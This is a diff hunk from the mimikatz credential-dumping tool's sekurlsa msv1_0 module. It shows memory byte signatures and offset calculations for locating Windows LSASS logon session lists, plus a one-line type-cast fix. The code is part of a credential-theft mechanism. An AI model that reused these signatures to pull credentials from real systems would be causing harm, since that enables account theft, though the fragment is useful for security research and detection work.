@@ -22,7 +22,7 @@ bool mod_mimikatz_sekurlsa_msv1_0::searchLogonSessionList()
 	BYTE PTRN_WIN6_LogonSessionList[]		= {0x4C, 0x03, 0xD8, 0x49, 0x8B, 0x03, 0x48, 0x89};//, 0x06, 0x4C, 0x89, 0x5E};
 	BYTE PTRN_WIN5_LogonSessionList[]		= {0x4C, 0x8B, 0xDF, 0x49, 0xC1, 0xE3, 0x04, 0x48, 0x8B, 0xCB, 0x4C, 0x03, 0xD8};
 	
-	LONG OFFS_WALL_LogonSessionList			= -sizeof(long);
+	LONG OFFS_WALL_LogonSessionList			= -(LONG)sizeof(long);
 	LONG OFFS_WN60_LogonSessionListCount	= OFFS_WALL_LogonSessionList - (3 + 4 + 3 + 6 + 3 + 2 + 8 + 7 + 4 + 4 + 2 + 3 + 3 + (LONG)sizeof(long));
 	LONG OFFS_WN61_LogonSessionListCount	= OFFS_WALL_LogonSessionList - (3 + 4 + 3 + 6 + 3 + 2 + 8 + 7 + 4 + 4 + 2 + 3 + 2 + (LONG)sizeof(long));
 	LONG OFFS_WIN5_LogonSessionListCount	= OFFS_WALL_LogonSessionList - (3 + 6 + 3 + 8 + 4 + 4 + 2 + 3 + 2 + 2 + (LONG)sizeof(long));
